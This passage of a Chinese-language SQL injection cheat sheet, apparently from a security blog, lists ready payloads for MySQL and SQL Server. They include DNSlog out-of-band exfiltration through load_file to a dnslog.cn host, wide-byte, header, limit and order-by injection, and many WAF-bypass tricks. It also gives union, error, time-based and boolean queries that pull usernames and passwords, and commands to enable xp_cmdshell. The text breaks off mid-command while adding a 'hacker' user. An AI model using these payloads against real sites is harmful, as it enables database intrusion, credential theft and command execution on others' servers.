加密的字符串其中 %3D 是编码中的 &#x3D; 符号，把他发送到编码模块当中解密, 得到明文</p><p>发现这个是注入点需要将原来的注入方式重新加密发送给服务器，可以构造注入语句进行 base64 加密进行报错注入</p><p><img src="https://image.3001.net/images/20220714/1657765539_62cf7ea3330691d8a8415.png!small"></p><h3 id="Dnslog-对外注入"><a href="#Dnslog-对外注入" class="headerlink" title="Dnslog 对外注入"></a>Dnslog 对外注入</h3><p>通常我们面对 SQL 注入过程中没有回显的情况下，只能通过盲注的方式来判断是否存在 SQL 注入，但是，使用盲注，手工测试是需要花费大量的时间的，可能会想到使用 sqlmap 直接去跑出数据，但在实际测试中，使用 sqlmap 跑盲注，有很大的几率，网站把 ip 给封掉，这就影响了我们的测试进度，也许你也可以使用代理池</p><p>注入语句：</p><p>?id&#x3D;1’and (select load_file(concat(‘\\‘,(select hex(user())),’.682y4b.dnslog.cn&#x2F;abc’))) –+</p><p>?id&#x3D;1’and (select load_file(concat(‘\\‘,(select database()),’.682y4b.dnslog.cn&#x2F;abc’))) –+</p><h3 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h3><p>比如受害者网站 URL 注入点是经过编码的，不能直接结合 sqlmap 进行漏洞利用，所以本地搭建一个网站，写一个 php 脚本编码文件，就可以结合 sqlmap 工具进行测试。</p><p>因为，注入点经过复杂编码之后，就不能直接结合 sqlmap 进行漏洞攻击了。或者 sqlmap 自己编写 tamper 脚本进行攻击</p><p>可参考：<a href="https://blog.csdn.net/weixin/_40412037/article/details/110088186">https://blog.csdn.net/weixin\_40412037/article/details/110088186</a></p><h3 id="搜索框注入"><a href="#搜索框注入" class="headerlink" title="搜索框注入"></a>搜索框注入</h3><p>注入 payload：</p><p>%’and’%1%’&#x3D;’%1</p><p>%’and’%1%’&#x3D;’%2</p><p>Sql 数据库语句：select * from sqltest where names like ‘% 要查询的关键字 %’</p><p>a%’ and 1&#x3D;1– 正常</p><p>a%’ and 1&#x3D;2– 错误</p><p>有搜索数据的框可以试试加个 % 总能大力出奇迹</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>前提</p><p>1. 使用了 addslashes() 函数</p><p>2. 数据库设置了编码模式为 GBK</p><p>原理：前端输入 %df 时，首先经过 addslashes() 转义变成 %df%5c%27，之后，在数据库查询前，因为设置了 GBK 编码，GBK 编码在汉字编码范围内的两个字节都会重新编码成一个汉字。然后 mysql 服务器会对查询的语句进行 GBK 编码，%df%5c 编码成了 “运”，而单引号逃逸了出来，形成了注入漏洞</p><p>?id&#x3D;%df’ and 1&#x3D;1 –+</p><p>?id&#x3D;%df’ and 1&#x3D;2 –+</p><p>?id&#x3D;-1%df’ union select 1,2,3 %23</p><h3 id="Cookie-注入和-Xff-注入"><a href="#Cookie-注入和-Xff-注入" class="headerlink" title="Cookie 注入和 Xff 注入"></a>Cookie 注入和 Xff 注入</h3><p>主要是看看程序员有没有在 cookie 中做了一些过滤，我们有没有可趁之机。</p><p>Cookie: ‘ order by 4–+</p><p>X-Forwarded-For 注入</p><p>代表客户端真实的 IP，通过修改 X-Forwarded-for 的值可以伪造客户端 IP</p><p>尝试抓包添加插入 X-Forwarded-For:127.0.0.1 头进行 sql 注入</p><h3 id="Between-注入"><a href="#Between-注入" class="headerlink" title="Between 注入"></a>Between 注入</h3><p>主要用于盲注看页面是否有变化，原理如下，例如 username 的字符内容是 test1，第一个字符是 t，a 到 b 搜索不了，页面不正常。 a 到 t 就有了，页面正常</p><p>mysql 语句： select * from users where id &#x3D;1 and substr(username,1,1) between ‘a’ and ‘b’;</p><p>select * from users where id &#x3D;1 and substr(username,1,1) between ‘a’ and ‘t’;</p><p>借鉴大佬图片：</p><p><img src="https://image.3001.net/images/20220714/1657765568_62cf7ec07edc75bbb2cd0.png!small"></p><h3 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h3><p>mysql 语句： select * from limit test limit 1,[可控点] or select … limit [可控点]</p><p>limit 后面能够拼接的函数只有 into 和 procedure，into 可以用来写文件，本文我们不考虑。在 Limit 后面 可以用 procedure analyse() 这个子查询，而且只能用 extractvalue 和 benchmark 函数进行延时</p><p><em><strong>procedure analyse(updatexml(rand(),concat(0x3a,benchmark(10000000,sha1(1)))),1)</strong></em></p><p>select id from users;</p><p>select id from users limit 0,1 union select username from users;</p><p><img src="https://image.3001.net/images/20220714/1657765587_62cf7ed363bca35f96495.png!small"></p><p>select field from user where id &gt;0 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</p><p>基于时间盲注：</p><p>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</p><h3 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h3><p>select * from 表名 order by 列名 (或者数字) asc；升序 (默认升序)</p><p>select * from 表名 order by 列名 (或者数字) desc；降序</p><p>当页面出现 mysql 报错信息时，注入点在 order by 后面，此时可以利用报错信息进行注入，尝试报错注入</p><p><img src="https://image.3001.net/images/20220714/1657765602_62cf7ee2335a18b91bc38.png!small"></p><p>?sort&#x3D;1 and(select extractvalue(0x7e,concat(0x7e,database(),0x7e)))</p><p>?sort&#x3D;(select 1 from(select 1 and if(ascii(substr((user()),1,1))&#x3D;114,sleep(5),1))x)</p><h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h3><p>两个空格代替一个空格，用 Tab 代替空格，%a0 &#x3D; 空格：</p><p>payload:</p><p>%20 %09 %0a %0b %0c %0d %a0 %00 &#x2F;**&#x2F; &#x2F;<em>!</em>&#x2F;</p><p>最基本的绕过方法，用注释替换空格： &#x2F;* 注释 *&#x2F;</p><p><img src="https://image.3001.net/images/20220714/1657765618_62cf7ef2f3244c1249103.png!small"></p><p>括号绕过空格</p><p>mysql 语句：select(user())from dual where(1&#x3D;1)and(2&#x3D;2)</p><p>这种过滤方法常常用于 time based 盲注, 例如：</p><p>?id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23</p><h3 id="绕过引号"><a href="#绕过引号" class="headerlink" title="绕过引号"></a>绕过引号</h3><p>这个时候如果引号被过滤了，那么上面的 where 子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。users 的十六进制的字符串是 7573657273。那么最后的 sql 语句就变为了：</p><p>select column_name from information_schema.tables where table_name&#x3D;0x7573657273</p><h3 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h3><p>在使用盲注的时候，需要使用到 substr(),mid(),limit。这些子句方法都需要使用到逗号。对于 substr() 和 mid() 这两个方法可以使用 from to 的方式来解决：</p><p>select substr(database() from 1 for 1);</p><p>select mid(database() from 1 for 1);</p><p>使用 join：</p><p>union select 1,2#</p><p>等价于 union select * from (select 1)a join (select 2)b</p><p>使用 like:</p><p>select ascii(mid(user(),1,1))&#x3D;80 #</p><p>等价于 select user() like ‘r%’</p><p>对于 limit 可以使用 offset 来绕过：</p><p>select * from news limit 0,1 #</p><p>等价于下面这条 SQL 语句 select * from news limit 1 offset 0</p><h3 id="绕过比较符号"><a href="#绕过比较符号" class="headerlink" title="绕过比较符号 ()"></a>绕过比较符号 ()</h3><p>（过滤了 &lt;&gt;：sqlmap 盲注经常使用 &lt;&gt;，使用 between 的脚本）：</p><p>使用 greatest()、least（）：（前者返回最大值，后者返回最小值）</p><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到 greatest 来进行绕过了。 最常见的一个盲注的 sql 语句：</p><p>select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;64</p><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用, 那么就可以使用 greatest 来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数 (n1,n2,n3,…) 的最大值。 那么上面的这条 sql 语句可以使用 greatest 变为如下的子句:</p><p>select * from users where id&#x3D;1 and greatest(ascii(substr(database(),0,1)),64)&#x3D;64</p><h3 id="Between-注入-1"><a href="#Between-注入-1" class="headerlink" title="Between 注入"></a>Between 注入</h3><p>主要用于盲注看页面是否有变化，原理如下，例如 username 的字符内容是 test1，第一个字符是 t，a 到 b 搜索不了，页面不正常。 a 到 t 就有了，页面正常</p><p><img src="https://image.3001.net/images/20220714/1657765644_62cf7f0c4a9bf9f4e426d.png!small"></p><p>使用 between and：</p><p>使用 between and:</p><p>between a and b：</p><p>between 1 and 1; 等价于 &#x3D;1</p><h3 id="or-and-xor-not-绕过："><a href="#or-and-xor-not-绕过：" class="headerlink" title="or and xor not 绕过："></a>or and xor not 绕过：</h3><p>and&#x3D;&amp;&amp; or&#x3D;|| xor&#x3D;| not&#x3D;!</p><h3 id="绕过注释符"><a href="#绕过注释符" class="headerlink" title="绕过注释符"></a>绕过注释符</h3><p>（#，–(后面跟一个空格））过滤：</p><p>id&#x3D;1’union select 1,2,3||’1</p><p>最后的 or ‘1 闭合查询语句的最后的单引号，或者：</p><p>id&#x3D;1’union select 1,2,’3</p><h3 id="绕过等于号"><a href="#绕过等于号" class="headerlink" title="绕过等于号"></a>绕过等于号</h3><p>使用 like 、rlike 、regexp 或者 使用 &lt;或者&gt;</p><h3 id="绕过-union，select，where-等："><a href="#绕过-union，select，where-等：" class="headerlink" title="绕过 union，select，where 等："></a>绕过 union，select，where 等：</h3><p>（1）使用注释符绕过：</p><p>常用注释符：&#x2F;&#x2F;，– , &#x2F;**&#x2F;, #, –+, – -, ;,%00,–a</p><p>用法：U&#x2F;<strong>&#x2F; NION &#x2F;</strong>&#x2F; SE&#x2F;<strong>&#x2F; LECT &#x2F;</strong>&#x2F;user，pwd from user</p><p>（2）使用大小写绕过：</p><p>id&#x3D;-1’UnIoN&#x2F;**&#x2F;SeLeCT</p><p>（3）内联注释绕过：</p><p>id&#x3D;-1’&#x2F;<em>!UnIoN</em>&#x2F; SeLeCT 1,2,concat(&#x2F;<em>!table_name</em>&#x2F;) FrOM &#x2F;<em>information_schema</em>&#x2F;.tables &#x2F;<em>!WHERE <em>&#x2F;&#x2F;</em>!TaBlE_ScHeMa</em>&#x2F; like database()#</p><p>（4） 双关键字绕过（若删除掉第一个匹配的 union 就能绕过）：</p><p>id&#x3D;-1’UNIunionONSeLselectECT1,2,3–-</p><h3 id="WAF-绕过-应用层"><a href="#WAF-绕过-应用层" class="headerlink" title="WAF 绕过 - 应用层"></a>WAF 绕过 - 应用层</h3><p>Sql 绕过姿势：<a href="https://www.csdn.net/tags/MtTaEgwsMTU4NzM1LWJsb2cO0O0O.html">https://www.csdn.net/tags/MtTaEgwsMTU4NzM1LWJsb2cO0O0O.html</a></p><h4 id="大小写-x2F-关键字替换"><a href="#大小写-x2F-关键字替换" class="headerlink" title="大小写 &#x2F; 关键字替换"></a>大小写 &#x2F; 关键字替换</h4><ul><li><p>id&#x3D;1UnIoN&#x2F;**&#x2F;SeLeCT1,user()</p></li><li><p>Hex() bin() 等价于 ascii()</p></li><li><p>Sleep() 等价于 benchmark()</p></li><li><p>Mid() substring() 等价于 substr()</p></li><li><p>@@user 等价于 User()</p></li><li><p>@@Version 等价于 version()</p></li></ul><p>绕过：</p><p>AND -&gt; &amp;&amp;</p><p>OR -&gt; || &#x2F; ^</p><p>= -&gt; LIKE,REGEXP, BETWEEN, not <and not>，!&lt;&gt;</p><p>&gt; X -&gt; not between 0 and X</p><p>WHERE -&gt; HAVING</p><p>手工盲注 1’||ascii(substr(database(),2,1))&gt;&#x3D;’120</p><h4 id="各种编码"><a href="#各种编码" class="headerlink" title="各种编码"></a>各种编码</h4><p>大小写，URL，hex，%0A 等</p><h4 id="注释使用"><a href="#注释使用" class="headerlink" title="注释使用"></a>注释使用</h4><p>&#x2F;&#x2F;—-+#&#x2F;&#x2F;+:%00&#x2F;!&#x2F; 等</p><h4 id="再次循环"><a href="#再次循环" class="headerlink" title="再次循环"></a>再次循环</h4><p>union&#x3D;&#x3D;uunionnion</p><h4 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h4><p>比如在 burp 抓包时，存在 Post 请求的注入，如 id&#x3D;1’ and 1&#x3D;2#</p><p>尝试分块传输</p><p><img src="https://image.3001.net/images/20220714/1657765719_62cf7f578b907ecc13fdc.png!small"></p><p>进行分块传输的时候，请求头要加上 <strong>Transfer-Encoding: Chunked</strong>，然后 POST 的数据规则如下</p><p>2 #下面的数据的长度，可以在后面加个分号然后添加注释（2; hello world） id #请求的参数 2 #下面的数据的长度 &#x3D;1 #请求的值，和前面的 id 连起来 0 #表明分块请求结束，一个 0 和两个换行</p><p>最后就是大佬写出的插件，安装了一键分块 Orz<br><a href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p><h4 id="等价替换"><a href="#等价替换" class="headerlink" title="等价替换"></a>等价替换</h4><p>hex()、bin() &#x3D;&#x3D;&gt; ascii()<br>sleep() &#x3D;&#x3D;&gt;benchmark()<br>concat_ws()&#x3D;&#x3D;&gt;group_concat()<br>mid()、substr() &#x3D;&#x3D;&gt; substring()<br>@@user &#x3D;&#x3D;&gt; user()<br>@@datadir &#x3D;&#x3D;&gt; datadir()<br>举例：substring() 和 substr() 无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74　<br>或者：<br>substr((select ‘password’),1,1) &#x3D; 0x70<br>strcmp(left(‘password’,1), 0x69) &#x3D; 1<br>strcmp(left(‘password’,1), 0x70) &#x3D; 0<br>strcmp(left(‘password’,1), 0x71) &#x3D; -1</p><h4 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h4><p>?id&#x3D;1&amp;id&#x3D;2&amp;id&#x3D;3</p><h4 id="编码解码及加密解密"><a href="#编码解码及加密解密" class="headerlink" title="编码解码及加密解密"></a>编码解码及加密解密</h4><ul><li><p>s-&gt;%73-&gt;%25%37%33</p></li><li><p>hex,unlcode,base64 等</p></li></ul><h4 id="更改请求提交方式"><a href="#更改请求提交方式" class="headerlink" title="更改请求提交方式"></a>更改请求提交方式</h4><p>尝试更改 Get 请求为 Post 请求</p><ul><li><p>GET POST COOKIE 等</p></li><li><p>POST-&gt;multipart&#x2F;form-data</p></li></ul><h4 id="中间件-HPP-HTTP-参数污染"><a href="#中间件-HPP-HTTP-参数污染" class="headerlink" title="中间件 HPP(HTTP 参数污染)"></a>中间件 HPP(HTTP 参数污染)</h4><p><img src="https://image.3001.net/images/20220714/1657765734_62cf7f6657d4c137788e0.png!small"></p><p><strong>HPP</strong> 是 HTTP Parameter Pollution 的缩写，意为 HTTP 参数污染。</p><ul><li><p>原理：浏览器在跟服务器进行交互的过程中，浏览器往往会在 GET&#x2F;POST 请求里面带上参数，这些参数会以 名称 - 值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在 HTTP 协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="http://www.baidu.com/?name=aa&name=bb%EF%BC%8C%E9%92%88%E5%AF%B9%E5%90%8C%E6%A0%B7%E5%90%8D%E7%A7%B0%E7%9A%84%E5%8F%82%E6%95%B0%E5%87%BA%E7%8E%B0%E5%A4%9A%E6%AC%A1%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%8C%E4%B8%8D%E5%90%8C%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F%E4%BC%9A%E4%B8%8D%E4%B8%80%E6%A0%B7%E3%80%82%E6%9C%89%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%8F%96%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF">http://www.baidu.com?name=aa&amp;name=bb，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是</a> name&#x3D;aa。有的服务器是取第二个参数，也就是 name&#x3D;bb。有的服务器两个参数都取，也就是 name&#x3D;aa,bb 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p></li><li><p>HPP 漏洞，与 Web 服务器环境、服务端使用的脚本有关。如下是不同 Web 服务器对于出现多个参数时的选择</p></li><li><p>通过 HPP 接管账户, 当网站开发者不熟悉 Web 服务器对于多参数时如何选择，将给攻击者可乘之机。HPP 能针对客户端和服务端进行攻击。</p></li><li><p>HPP 参数污染还可以用于绕过某些防火墙对于 SQL 注入的检测，例如当 Web 服务器对多参数都同时选择时，我们可以用以下这种方式绕过某些防火墙：</p></li></ul><p><a href="http://www.test.com/index.asp?page=select">http://www.test.com/index.asp?page=select</a> 1,2,3 from table where id&#x3D;1<br><a href="http://www.test.com/index.asp?page=select">http://www.test.com/index.asp?page=select</a> 1&amp;page&#x3D;2,3 from table where id&#x3D;1</p><p>HTTP 参数污染是指当同一参数出现多次，不同的中间件会解析为不同的结果, 以参数 color&#x3D;red&amp;color&#x3D;blue 为例</p><h3 id="WAF-绕过-数据库特性"><a href="#WAF-绕过-数据库特性" class="headerlink" title="WAF 绕过 - 数据库特性"></a>WAF 绕过 - 数据库特性</h3><p>mysql 注释符有三种</p><ul><li>#,&#x2F;…&#x2F;,–…(注意 – 后面有一个空格，或者为 –+)</li></ul><p>空格符</p><ul><li>0x09,0x0a-0x0d,0x20,0xa0</li></ul><p>特殊符号：%a 换行符</p><ul><li>可结合注释符使用 %23%0a,%2d%2d%0a</li></ul><p>内联注释</p><ul><li>&#x2F;!UnIon12345SelEcT&#x2F;1,user(), 数字范围 1000-50540</li></ul><p>mysql 黑魔法</p><ul><li>select{xusername}from{x11test.admin};</li></ul><h3 id="WAF-绕过-逻辑层"><a href="#WAF-绕过-逻辑层" class="headerlink" title="WAF 绕过 - 逻辑层"></a>WAF 绕过 - 逻辑层</h3><p>逻辑问题</p><ol><li><p>云 waf 防护，一般我们会尝试通过查找站点的真实 IP，从而绕过 CDN 防护。</p></li><li><p>当提交 GET、POST 同时请求时，进入 POST 逻辑，而忽略了 GET 请求的有害参数输入, 可尝试 Bypass。</p></li><li><p>HTTP 和 HTTPS 同时开放服务，没有做 HTTP 到 HTTPS 的强制跳转，导致 HTTPS 有 WAF 防护，HTTP 没有防护，直接访问 HTTP 站点绕过防护。</p></li><li><p>特殊符号 %00，部分 waf 遇到 %00 截断，只能获取到前面的参数，无法获取到后面的有害参数输入，从而导致 Bypass。比如：id&#x3D;1 %00 and 1&#x3D;2 union select 1,2,column_name from information_schema.columns</p></li></ol><p>性能问题</p><ul><li><p>猜想 1：在设计 WAF 系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</p></li><li><p>猜想 2：不少 WAF 是 C 语言写的，而 C 语言自身没有缓冲区保护机制，因此如果 WAF 在处理测试向量时超出了其缓冲区长度就会引发 bug，从而实现绕过。</p></li></ul><p>例子 1：</p><p>?id&#x3D;1and(select1)&#x3D;(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9</p><ul><li>0xA*1000 指 0xA 后面 A 重复 1000 次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里 1000 只做参考也许在有些情况下可能不需要这么长也能溢出。</li></ul><p>例子 2：</p><p>?a0&#x3D;0&amp;a1&#x3D;1&amp;…..&amp;a100&#x3D;100&amp;id&#x3D;1<br>union<br>select<br>1,schema_name,3<br>from<br>INFORMATION_SCHEMA.schemata</p><ul><li>获取请求参数，只获取前 100 个参数，第 101 个参数并没有获取到，导致 SQL 注入绕过。</li></ul><p>白名单</p><ul><li><p>方式一：IP 白名单</p></li><li><p>从网络层获取的 ip，这种一般伪造不来，如果是获取客户端的 IP，这样就可能存在伪造 IP 绕过的情况。测试方法：修改 http 的 header 来 bypasswaf</p></li></ul><p>X-forwarded-for<br>X-remote-IP<br>X-originating-IP<br>x-remote-addr<br>X-Real-ip</p><p>方式二：静态资源</p><ul><li><p>特定的静态资源后缀请求，常见的静态文件 (.js.jpg.swf.css 等等)，类似白名单机制，waf 为了检测效率，不去检测这样一些静态文件名后缀的请求。</p></li><li><p>Aspx&#x2F;php 只识别到前面的. aspx&#x2F;.php 后面基本不识别</p></li></ul><p><a href="http://10.9.9.201/sql.php?id=1">http://10.9.9.201/sql.php?id=1</a><br><a href="http://10.9.9.201/sql.php/1.js?id=1">http://10.9.9.201/sql.php/1.js?id=1</a></p><p>方式三：url 白名单</p><ul><li>为了防止误拦，部分 waf 内置默认的白名单列表，如 admin&#x2F;manager&#x2F;system 等管理后台。只要 url 中存在白名单的字符串，就作为白名单不进行检测。常见的 url 构造姿势</li></ul><p>学习文章：<a href="https://mp.weixin.qq.com/s/gjEPi8DKVsfGyEv8fnzY3Q">https://mp.weixin.qq.com/s/gjEPi8DKVsfGyEv8fnzY3Q</a></p><p><strong>SQL Server</strong> 数据库是由 Microsoft 开发和推广的关系数据库管理系统 (DBMS)，是一个比较大型的数据库。端口号为 <strong>1433</strong>。数据库后缀名 .mdf，注释符是 – 。延时命令：WAITFOR DELAY ‘0:0:2’</p><p><strong>SQLServer 有三个权限级别：</strong></p><ul><li><p>sa 权限：数据库操作，文件管理，命令执行，注册表读取等 system。SQLServer 数据库的最高权限</p></li><li><p>db 权限：文件管理，数据库操作等权限 users-administrators</p></li><li><p>public 权限：数据库操作 guest-users</p></li></ul><p><img src="https://image.3001.net/images/20220714/1657765752_62cf7f787d9033b77f774.png!small"></p><p>判断是否是 SA 权限 (数据库操作、文件管理、命令执行、注册表读取)</p><ol><li>select is_srvrolemember(‘sysadmin’)</li></ol><p>判断是否是 db_owner 权限 (数据库操作、文件管理)</p><ol><li>select is_member(‘db_owner’)</li></ol><p>判断是否是 public 权限 (数据库操作)</p><ol><li>select is_srvrolemember(‘public’)</li></ol><p>SQLServer 数据库有 6 个默认的库，分别是 4 个系统数据库：master 、model 、msdb 、tempdb，和 2 个实例数据库：ReportServer、ReportServerTempDB。其中，系统数据库 model 和 tempdb 默认是没有数据表的。</p><p>附上 payload：</p><p>select @@version; #查询数据库的版本</p><p>select @@servername; #查询服务名</p><p>select host_name(); #查询主机名，如果是用 navicat 远程连接的话，主机名是本地的名字</p><p>select db_name(); #查询当前数据库名</p><p>select db_name(1); #查询第一个数据库名</p><p>select db_name(2); #查询第二个数据库名</p><p>select user; #查询当前数据库的拥有者，结果为 dbo。dbo 是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即 DbOwner</p><p>use tempdb #切换到 tempdb 表</p><p>top n #查询前 n 条记录</p><p>limit 2,3 #查询第 2 条开始的 3 条数据，也就是 2,3,4</p><p>select substring(‘string’,2,1) #截取给定字符串的索引为 2 的 1 个字符</p><p>select ascii(‘a’) #查询给定字符串的 ascii 值</p><p>select len(‘string’) #查询给定字符串的长度</p><p>EXEC sp_spaceused @updateusage &#x3D; N’TRUE’; #查询当前数据库的大小</p><p>sp_spaceused ‘表名’ #查询指定表名的大小</p><p>EXEC master.sys.xp_dirtree ‘\192.168.106.5\xx.txt’,0,1;</p><p>判断是否是 SA 权限</p><p>select is_srvrolemember(‘sysadmin’)</p><p>判断是否是 db_owner 权限</p><p>select is_member(‘db_owner’)</p><p>判断是否是 public 权限</p><p>select is_srvrolemember(‘public’)</p><h3 id="普通注入-1"><a href="#普通注入-1" class="headerlink" title="普通注入"></a>普通注入</h3><p>order by 2 成功；order by 3 失败； order by 4 成功；order by 5 失败 说明列数位于 3-4 之间。查找回显点</p><p>id&#x3D;2 and 1&#x3D;2 union all select null,null,null,null；挨个替换 null 发现 select null,2,null,null 页面出现回显。</p><p>查找所在库名称添加： ?id&#x3D;2 and 1&#x3D;2 union all select 1,(select db_name()), ‘3’, 4</p><p>找到数据库名称。 提示：这里也可以使用 db_name(1)、db_name(2) 等查询其他数据</p><p>查找数据库表名称：?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype &#x3D; ‘U’),’3’,4 提示: xtype&#x3D;’U’ 为 用户表</p><p>?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 col_name(object_id(‘manage’),1) from sysobjects),’3’,4 替换 col_name(object_id(‘manage’),1) 中的 1 依次为 2，3，4 查出所有列名。</p><p>查取数据: ?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 username from manage),’3’,4 获取用户名；</p><p>?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 password from manage),’3’,4 获取密码</p><h2 id="全回显操作"><a href="#全回显操作" class="headerlink" title="全回显操作"></a>全回显操作</h2><p>获取当前数据库中的表（有 2 个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于 mssql2005 及以上版本）】</p><p>(select quotename(name) from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p><p>(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p><p>案例： mozhe_dbv2 是数据库名字</p><p><img src="https://image.3001.net/images/20220714/1657765776_62cf7f9087fb6626ca007.png!small"></p><p>一次爆指定表的所有列（只限于 mssql2005 及以上版本）：</p><p>(select quotename(name) from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))–</p><p>(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))—</p><p>案例： mange 是表名  </p><p><img src="https://image.3001.net/images/20220714/1657765789_62cf7f9d50b3e1805fb70.png!small"></p><h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><p>and 1&#x3D;(select @@VERSION) &#x2F;&#x2F;<strong>MSSQL</strong> 版本</p><p>And 1&#x3D;(select db_name()) &#x2F;&#x2F; 当前数据库名</p><p>and 1&#x3D;(select @@servername) &#x2F;&#x2F; 本地服务名</p><p>and 1&#x3D;(select IS_SRVROLEMEMBER(‘sysadmin’)) &#x2F;&#x2F; 判断是否是系统管理员 sa</p><p>常用权限：sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin</p><p>and 1&#x3D;(Select IS_MEMBER(‘db_owner’)) &#x2F;&#x2F; 判断是否是库权限 dbo</p><p>and 1&#x3D; (Select HAS_DBACCESS(‘master’)) &#x2F;&#x2F; 判断是否有库读取权限</p><h3 id="2-单个爆破："><a href="#2-单个爆破：" class="headerlink" title="(2) 单个爆破："></a>(2) 单个爆破：</h3><p>and 1&#x3D;convert(int,(select top 1 table_name from information_schema.tables))—获取第一个表名</p><p>and 1&#x3D;convert(int,(select top 1 table_name from information_schema.tables where table_name not in(‘photoGalary’) )) 获取第二个表名</p><p>and 1&#x3D;convert(int,(select top 1 column_name from information_schema.columns where table_name&#x3D;’login’))— 获取第一个列名</p><p>and 1&#x3D;convert(int,(select top 1 username from login))</p><p>and 1&#x3D;convert(int,(select top 1 password from login))</p><h3 id="2-全爆语句"><a href="#2-全爆语句" class="headerlink" title="(2) 全爆语句"></a>(2) 全爆语句</h3><p> 爆表，要求 sqlserver 版本 2005 以上</p><p>and 1&#x3D;(select quotename(name) from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–<br>and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p><p>爆列</p><p>and 1&#x3D;(select quotename(name) from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))–<br>and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))—</p><h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><p>aspx?id&#x3D;1;if (select IS_SRVROLEMEMBER(‘sysadmin’))&#x3D;1 WAITFOR DELAY ‘0:0:5’ –</p><p>如果是 sa 权限，就延时。</p><p>案例：</p><p><img src="https://image.3001.net/images/20220714/1657766248_62cf8168dbaad26776ceb.png!small"></p><p>判断内容</p><p>aspx?id&#x3D;1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))&gt;1 WAITFOR DELAY ‘0:0:5’–</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>1.aspx?id&#x3D;1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) &gt;&#x3D; 109</p><h3 id="XP-CMDSHELL-检测"><a href="#XP-CMDSHELL-检测" class="headerlink" title="XP_CMDSHELL 检测"></a>XP_CMDSHELL 检测</h3><p>看下目标的 xp_cmdshell 存储过程是否还在, 主要是想看它有没有被删掉, 你也可以用这种方式来查询其它你想知道的任何存储过程，如果判断还在，页面显示正常，不在的话页面报错。</p><p>and 1&#x3D;(select count(*) from master..sysobjects where xtype &#x3D; ‘x’ and name &#x3D; ‘xp_cmdshell’) –</p><p>开启 xpcmdshell 一句话。前提 1、支持堆叠 2、扩展存储过程没被删除</p><p>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p><p>前提：sa 权限探测是否存在 1433 端口。然后检测是否开启 CMDSHELL</p><p>用 XP_CMDSHELL 添加用户 hacker：</p><p>exec master..xp_cmdshell 